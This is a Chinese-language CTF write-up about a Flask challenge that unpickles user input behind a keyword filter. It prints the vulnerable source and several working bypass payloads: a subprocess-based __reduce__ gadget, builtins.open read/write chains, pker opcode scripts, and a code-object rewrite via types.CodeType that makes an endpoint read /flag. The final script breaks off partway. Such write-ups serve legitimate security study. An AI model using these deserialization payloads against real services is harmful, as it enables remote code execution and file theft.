request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'POST'</span><span class="token punctuation">:</span>        username <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span>        password <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> username <span class="token operator">==</span> <span class="token string">'admin'</span> <span class="token punctuation">:</span>            <span class="token keyword">if</span> password <span class="token operator">==</span> admin<span class="token punctuation">.</span>password<span class="token punctuation">:</span>                session<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"admin"</span>                <span class="token keyword">return</span> <span class="token string">"Welcome Admin"</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                <span class="token keyword">return</span> <span class="token string">"Invalid Credentials"</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            session<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">=</span> username    <span class="token keyword">return</span> <span class="token triple-quoted-string string">'''        &lt;form method="post">        &lt;!-- /src may help you>            Username: &lt;input type="text" name="username">&lt;br>            Password: &lt;input type="password" name="password">&lt;br>            &lt;input type="submit" value="Login">        &lt;/form>    '''</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/ppicklee'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">ppicklee</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span>    sys<span class="token punctuation">.</span>modules<span class="token punctuation">[</span><span class="token string">'os'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"not allowed"</span>    sys<span class="token punctuation">.</span>modules<span class="token punctuation">[</span><span class="token string">'sys'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"not allowed"</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        pickle_data <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>data<span class="token punctuation">)</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token punctuation">&#123;</span><span class="token string">"os"</span><span class="token punctuation">,</span> <span class="token string">"system"</span><span class="token punctuation">,</span> <span class="token string">"eval"</span><span class="token punctuation">,</span> <span class="token string">'setstate'</span><span class="token punctuation">,</span> <span class="token string">"globals"</span><span class="token punctuation">,</span> <span class="token string">'exec'</span><span class="token punctuation">,</span> <span class="token string">'__builtins__'</span><span class="token punctuation">,</span> <span class="token string">'template'</span><span class="token punctuation">,</span> <span class="token string">'render'</span><span class="token punctuation">,</span> <span class="token string">'\\'</span><span class="token punctuation">,</span>                 <span class="token string">'compile'</span><span class="token punctuation">,</span> <span class="token string">'requests'</span><span class="token punctuation">,</span> <span class="token string">'exit'</span><span class="token punctuation">,</span>  <span class="token string">'pickle'</span><span class="token punctuation">,</span><span class="token string">"class"</span><span class="token punctuation">,</span><span class="token string">"mro"</span><span class="token punctuation">,</span><span class="token string">"flask"</span><span class="token punctuation">,</span><span class="token string">"sys"</span><span class="token punctuation">,</span><span class="token string">"base"</span><span class="token punctuation">,</span><span class="token string">"init"</span><span class="token punctuation">,</span><span class="token string">"config"</span><span class="token punctuation">,</span><span class="token string">"session"</span><span class="token punctuation">&#125;</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> i<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">in</span> pickle_data<span class="token punctuation">:</span>                <span class="token keyword">return</span> i<span class="token operator">+</span><span class="token string">" waf !!!!!!!"</span>        pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>pickle_data<span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token string">"success pickle"</span>    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"fail pickle"</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/admin'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">admin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    username <span class="token operator">=</span> session<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span>    <span class="token keyword">if</span> username <span class="token operator">!=</span> <span class="token string">"admin"</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">'You are not admin!'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token string">"Welcome Admin"</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/src'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">src</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span>  <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"app.py"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">,</span>encoding<span class="token operator">=</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> debug<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">5000</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>flag路径已知在&#x2F;flag，根本逻辑就是 pickle 绕 waf 打文件包含</p><p>值得注意的是开头引入了 builtins 和 io 两个库</p><p>观察一下waf</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token string">"os"</span><span class="token punctuation">,</span> <span class="token string">"system"</span><span class="token punctuation">,</span> <span class="token string">"eval"</span><span class="token punctuation">,</span> <span class="token string">'setstate'</span><span class="token punctuation">,</span> <span class="token string">"globals"</span><span class="token punctuation">,</span> <span class="token string">'exec'</span><span class="token punctuation">,</span><span class="token string">'__builtins__'</span><span class="token punctuation">,</span> <span class="token string">'template'</span><span class="token punctuation">,</span> <span class="token string">'render'</span><span class="token punctuation">,</span> <span class="token string">'\\'</span><span class="token punctuation">,</span> <span class="token string">'compile'</span><span class="token punctuation">,</span> <span class="token string">'requests'</span><span class="token punctuation">,</span><span class="token string">'exit'</span><span class="token punctuation">,</span> <span class="token string">'pickle'</span><span class="token punctuation">,</span> <span class="token string">"class"</span><span class="token punctuation">,</span> <span class="token string">"mro"</span><span class="token punctuation">,</span> <span class="token string">"flask"</span><span class="token punctuation">,</span> <span class="token string">"sys"</span><span class="token punctuation">,</span> <span class="token string">"base"</span><span class="token punctuation">,</span> <span class="token string">"init"</span><span class="token punctuation">,</span><span class="token string">"config"</span><span class="token punctuation">,</span> <span class="token string">"session"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>观察一下，引入的库里也就 builtins 和 io 没被ban</p> <br><h2 id="非预期"><a href="#非预期" class="headerlink" title="非预期"></a>非预期</h2><p>想了半天怎么用它给的 io 把读取的文件对象带出来，结果直接用<code>subprocess</code>库 cp 到 app.py 就行了</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64<span class="token keyword">import</span> pickle<span class="token keyword">import</span> subprocess  <span class="token keyword">class</span> <span class="token class-name">proc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__reduce__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span>subprocess<span class="token punctuation">.</span>check_output<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"cp"</span><span class="token punctuation">,</span><span class="token string">"/flag"</span><span class="token punctuation">,</span><span class="token string">"/app/app.py"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   a<span class="token operator">=</span>proc<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><p>还可以利用 builtins.open 读出 &#x2F;flag 再写入 app.py</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">builtins<span class="token punctuation">.</span><span class="token builtin">getattr</span><span class="token punctuation">(</span>builtins<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'/flag'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'read'</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span>builtins<span class="token punctuation">.</span><span class="token builtin">getattr</span><span class="token punctuation">(</span>builtins<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'./app.py'</span><span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'write'</span><span class="token punctuation">)</span><span class="token punctuation">(</span>builtins<span class="token punctuation">.</span><span class="token builtin">getattr</span><span class="token punctuation">(</span>builtins<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'/flag'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'read'</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>写pker脚本生成opcode：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">getattr</span> <span class="token operator">=</span> GLOBAL<span class="token punctuation">(</span><span class="token string">'builtins'</span><span class="token punctuation">,</span> <span class="token string">'getattr'</span><span class="token punctuation">)</span><span class="token builtin">open</span> <span class="token operator">=</span> GLOBAL<span class="token punctuation">(</span><span class="token string">'builtins'</span><span class="token punctuation">,</span> <span class="token string">'open'</span><span class="token punctuation">)</span>flag<span class="token operator">=</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'/flag'</span><span class="token punctuation">)</span>read<span class="token operator">=</span><span class="token builtin">getattr</span><span class="token punctuation">(</span>flag<span class="token punctuation">,</span> <span class="token string">'read'</span><span class="token punctuation">)</span>f<span class="token operator">=</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'./app.py'</span><span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">)</span>write<span class="token operator">=</span><span class="token builtin">getattr</span><span class="token punctuation">(</span>f<span class="token punctuation">,</span> <span class="token string">'write'</span><span class="token punctuation">)</span>fff<span class="token operator">=</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>write<span class="token punctuation">(</span>fff<span class="token punctuation">)</span><span class="token keyword">return</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="预期"><a href="#预期" class="headerlink" title="预期"></a>预期</h2><p>预期蛮有意思，也契合了这题的题目名称——const</p><h3 id="python字节码"><a href="#python字节码" class="headerlink" title="python字节码"></a>python字节码</h3><p>首先了解一下python的字节码，参考：<a href="https://developer.aliyun.com/article/1615860">https://developer.aliyun.com/article/1615860</a></p><p>PyCodeObject 的底层结构：Include&#x2F;code.h</p><pre class="line-numbers language-h" data-language="h"><code class="language-h">typedef struct &#123;    PyObject_HEAD&#x2F;&#x2F; 头部信息，我们看到真的一切皆对象，字节码也是个对象    int co_argcount;&#x2F;&#x2F; 可以通过位置参数传递的参数个数    int co_posonlyargcount;     &#x2F;&#x2F; 只能通过位置参数传递的参数个数，Python3.8新增    int co_kwonlyargcount;     &#x2F;&#x2F; 只能通过关键字参数传递的参数个数    int co_nlocals;             &#x2F;&#x2F; 代码块中局部变量的个数，也包括参数    int co_stacksize;          &#x2F;&#x2F; 执行该段代码块需要的栈空间    int co_flags;               &#x2F;&#x2F; 参数类型标识        int co_firstlineno;         &#x2F;&#x2F; 代码块在文件中的行号    PyObject *co_code;         &#x2F;&#x2F; 指令集，也就是字节码，它是一个bytes对象     PyObject *co_consts;       &#x2F;&#x2F; 常量池，一个元组，保存代码块中的所有常量    PyObject *co_names;      &#x2F;&#x2F; 一个元组，保存代码块中引用的其它作用域的变量       PyObject *co_varnames;    &#x2F;&#x2F; 一个元组，保存当前作用域中的变量    PyObject *co_freevars;      &#x2F;&#x2F; 内层函数引用的外层函数的作用域中的变量    PyObject *co_cellvars;      &#x2F;&#x2F; 外层函数的作用域中被内层函数引用的变量，本质上和co_freevars是一样的    Py_ssize_t *co_cell2arg;    PyObject *co_filename;    &#x2F;&#x2F; 代码块所在的文件名    PyObject *co_name;         &#x2F;&#x2F; 代码块的名字，通常是函数名、类名，或者文件名    PyObject *co_lnotab;        &#x2F;&#x2F; 字节码指令与python源代码的行号之间的对应关系，以PyByteObject的形式存在&#125; PyCodeObject;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>python 编译器在对源代码进行编译的时候，对于代码中的每一个 block，都会创建一个 PyCodeObject 与之对应</p><p>block：当进入一个新的命名空间，或者说作用域时，就算是进入了一个新的 block</p><p>demo：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">:</span>    a <span class="token operator">=</span> <span class="token number">123</span><span class="token keyword">def</span> <span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    a <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>这段代码编译完后会产生三个 PyCodeObject 对象，因为这是三个不同的作用域，一个是对应整个 py 文件（模块）的，一个是对应 <code>class A</code> 的，一个是对应 <code>def foo</code> 的</p><br><p>然后是获取 PyCodeObject，首先该对象在 Python 里面的类型是 <code>&lt;class &#39;code&#39;&gt;</code>，但是底层没有将这个类暴露给我们，我们可以用<code>__code__</code>的方式获取</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">src</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"app.py"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>src<span class="token punctuation">.</span>__code__<span class="token punctuation">)</span>  <span class="token comment"># &lt;code object ......</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">type</span><span class="token punctuation">(</span>src<span class="token punctuation">.</span>__code__<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># &lt;class 'code'></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>既然拿到对象了就能拿到底层对应的 PyCodeObject 对象，对象种类参考上面的数据结构</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">src</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"app.py"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>oCode <span class="token operator">=</span> src<span class="token punctuation">.</span>__code__<span class="token keyword">print</span><span class="token punctuation">(</span>oCode<span class="token punctuation">.</span>co_argcount<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>oCode<span class="token punctuation">.</span>co_posonlyargcount<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>oCode<span class="token punctuation">.</span>co_kwonlyargcount<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>oCode<span class="token punctuation">.</span>co_nlocals<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>oCode<span class="token punctuation">.</span>co_stacksize<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>oCode<span class="token punctuation">.</span>co_flags<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>oCode<span class="token punctuation">.</span>co_code<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>oCode<span class="token punctuation">.</span>co_consts<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>oCode<span class="token punctuation">.</span>co_names<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>oCode<span class="token punctuation">.</span>co_varnames<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>oCode<span class="token punctuation">.</span>co_filename<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>oCode<span class="token punctuation">.</span>co_name<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>oCode<span class="token punctuation">.</span>co_firstlineno<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>oCode<span class="token punctuation">.</span>co_lnotab<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>oCode<span class="token punctuation">.</span>co_freevars<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>oCode<span class="token punctuation">.</span>co_cellvars<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>输出之后发现一些有趣的部分</p><p><img src="/blog/2024/12/21/DASCTF-x-0psu3-2024%E6%9C%80%E5%90%8E%E4%B8%80%E6%88%98/image-20250113224313652.png" alt="image-20250113224313652"></p><p>我们如果能够篡改这里的 co_consts 部分为 flag 即可实现读取文件</p><h3 id="创建codeObject"><a href="#创建codeObject" class="headerlink" title="创建codeObject"></a>创建codeObject</h3><p>参考：<a href="https://stackoverflow.com/questions/16064409/how-to-create-a-code-object-in-python">https://stackoverflow.com/questions/16064409/how-to-create-a-code-object-in-python</a></p><p>使用<code>types.CodeType</code>方法实现</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> types<span class="token keyword">def</span> <span class="token function">src</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"app.py"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>oCode <span class="token operator">=</span> src<span class="token punctuation">.</span>__code__src<span class="token punctuation">.</span>__code__ <span class="token operator">=</span> types<span class="token punctuation">.</span>CodeType<span class="token punctuation">(</span>    oCode<span class="token punctuation">.</span>co_argcount<span class="token punctuation">,</span>    oCode<span class="token punctuation">.</span>co_posonlyargcount<span class="token punctuation">,</span>    oCode<span class="token punctuation">.</span>co_kwonlyargcount<span class="token punctuation">,</span>    oCode<span class="token punctuation">.</span>co_nlocals<span class="token punctuation">,</span>    oCode<span class="token punctuation">.</span>co_stacksize<span class="token punctuation">,</span>    oCode<span class="token punctuation">.</span>co_flags<span class="token punctuation">,</span>    oCode<span class="token punctuation">.</span>co_code<span class="token punctuation">,</span>    <span class="token punctuation">(</span><span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token string">'/flag'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">,</span> <span class="token string">'utf-8'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">'encoding'</span><span class="token punctuation">,</span> <span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    oCode<span class="token punctuation">.</span>co_names<span class="token punctuation">,</span>    oCode<span class="token punctuation">.</span>co_varnames<span class="token punctuation">,</span>    oCode<span class="token punctuation">.</span>co_filename<span class="token punctuation">,</span>    oCode<span class="token punctuation">.</span>co_name<span class="token punctuation">,</span>    oCode<span class="token punctuation">.</span>co_firstlineno<span class="token punctuation">,</span>    oCode<span class="token punctuation">.</span>co_lnotab<span class="token punctuation">,</span>    oCode<span class="token punctuation">.</span>co_freevars<span class="token punctuation">,</span>    oCode<span class="token punctuation">.</span>co_cellvars<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>src<span class="token punctuation">.</span>__code__<span class="token punctuation">.</span>co_consts<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>src<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2024/12/21/DASCTF-x-0psu3-2024%E6%9C%80%E5%90%8E%E4%B8%80%E6%88%98/image-20250113225724417.png" alt="image-20250113225724417"></p><h3 id="构造pickle"><a href="#构造pickle" class="headerlink" title="构造pickle"></a>构造pickle</h3><p>最头大的一集，怎么手搓呢（</p><p>在此之前，要先把上面的<code>.</code>全部换成 getattr 的形式</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">g1 <span class="token operator">=</span> builtins<span class="token punctuation">.</span><span class="token builtin">getattr</span>g2 <span class="token operator">=</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>src<span class="token punctuation">,</span><span class="token string">"__code__"</span><span class="token punctuation">)</span>g3 <span class="token operator">=</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>g2<span class="token punctuation">,</span><span class="token string">"co_argcount"</span><span class="token punctuation">)</span>g4 <span class="token operator">=</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>g2<span class="token punctuation">,</span><span class="token string">"co_posonlyargcount"</span><span class="token punctuation">)</span>g5 <span class="token operator">=</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>g2<span class="token punctuation">,</span><span class="token string">"co_kwonlyargcount"</span><span class="token punctuation">)</span>g6 <span class="token operator">=</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>g2<span class="token punctuation">,</span><span class="token string">"co_nlocals"</span><span class="token punctuation">)</span>g7 <span class="token operator">=</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>g2<span class="token punctuation">,</span><span class="token string">"co_stacksize"</span><span class="token punctuation">)</span>g8 <span class="token operator">=</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>g2<span class="token punctuation">,</span><span class="token string">"co_flags"</span><span class="token punctuation">)</span>g9 <span class="token operator">=</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>g2<span class="token punctuation">,</span><span class="token string">"co_code"</span><span class="token punctuation">)</span>g10 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token string">'/flag'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">,</span> <span class="token string">'utf-8'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">'encoding'</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># g10 = getattr(g2,"co_consts")</span>g11 <span class="token operator">=</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>g2<span class="token punctuation">,</span><span class="token string">"co_names"</span><span class="token punctuation">)</span>g12 <span class="token operator">=</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>g2<span class="token punctuation">,</span><span class="token string">"co_varnames"</span><span class="token punctuation">)</span>g13 <span class="token operator">=</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>g2<span class="token punctuation">,</span><span class="token string">"co_filename"</span><span class="token punctuation">)</span>g14 <span class="token operator">=</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>g2<span class="token punctuation">,</span><span class="token string">"co_name"</span><span class="token punctuation">)</span>g15 <span class="token operator">=</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>g2<span class="token punctuation">,</span><span class="token string">"co_firstlineno"</span><span class="token punctuation">)</span>g16 <span class="token operator">=</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>g2<span class="token punctuation">,</span><span class="token string">"co_lnotab"</span><span class="token punctuation">)</span>g17 <span class="token operator">=</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>g2<span class="token punctuation">,</span><span class="token string">"co_freevars"</span><span class="token punctuation">)</span>g18 <span class="token operator">=</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>g2<span class="token punctuation">,</span><span class="token string">"co_cellvars"</span><span class="token punctuation">)</span>g19 <span class="token operator">=</span> types<span class="token punctuation">.</span>CodeType<span class="token punctuation">(</span>g3<span class="token punctuation">,</span>g4<span class="token punctuation">,</span>g5<span class="token punctuation">,</span>g6<span class="token punctuation">,</span>g7<span class="token punctuation">,</span>g8<span class="token punctuation">,</span>g9<span class="token punctuation">,</span>g10<span class="token punctuation">,</span>g11<span class="token punctuation">,</span>g12<span class="token punctuation">,</span>g13<span class="token punctuation">,</span>g14<span class="token punctuation">,</span>g15<span class="token punctuation">,</span>g16<span class="token punctuation">,</span>g17<span class="token punctuation">,</span>g18<span class="token punctuation">)</span>g20 <span class="token operator">=</span> builtins<span class="token punctuation">.</span><span class="token builtin">setattr</span>g20<span class="token punctuation">(</span>src<span class="token punctuation">,</span><span class="token string">"__code__"</span><span class="token punctuation">,</span>g19<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>使用最新版的pker生成payload（2025.1.1更新支持NoneType）</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">getattr</span> <span class="token operator">=</span> GLOBAL<span class="token punctuation">(</span><span class="token string">'builtins'</span><span class="token punctuation">,</span> <span class="token string">'getattr'</span><span class="token punctuation">)</span><span class="token builtin">open</span> <span class="token operator">=</span> GLOBAL<span class="token punctuation">(</span><span class="token string">'builtins'</span><span class="token punctuation">,</span> <span class="token string">'open'</span><span class="token punctuation">)</span><span class="token builtin">setattr</span> <span class="token operator">=</span> GLOBAL<span class="token punctuation">(</span><span class="token string">'builtins'</span><span class="token punctuation">,</span> <span class="token string">'setattr'</span><span class="token punctuation">)</span>CodeType <span class="token operator">=</span> GLOBAL<span class="token punctuation">(</span><span class="token string">'types'</span><span class="token punctuation">,</span> <span class="token string">'CodeType'</span><span class="token punctuation">)</span>src <span class="token operator">=</span> GLOBAL<span class="token punctuation">(</span><span class="token string">'__main__'</span><span class="token punctuation">,</span> <span class="token string">'src'</span><span class="token punctuation">)</span>g2 <span class="token operator">=</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>src<span class="token punctuation">,</span><span class="token string">"__code__"</span><span class="token punctuation">)</span>g3 <span class="token operator">=</span> <span class="token builtin">getattr</span><span class="token 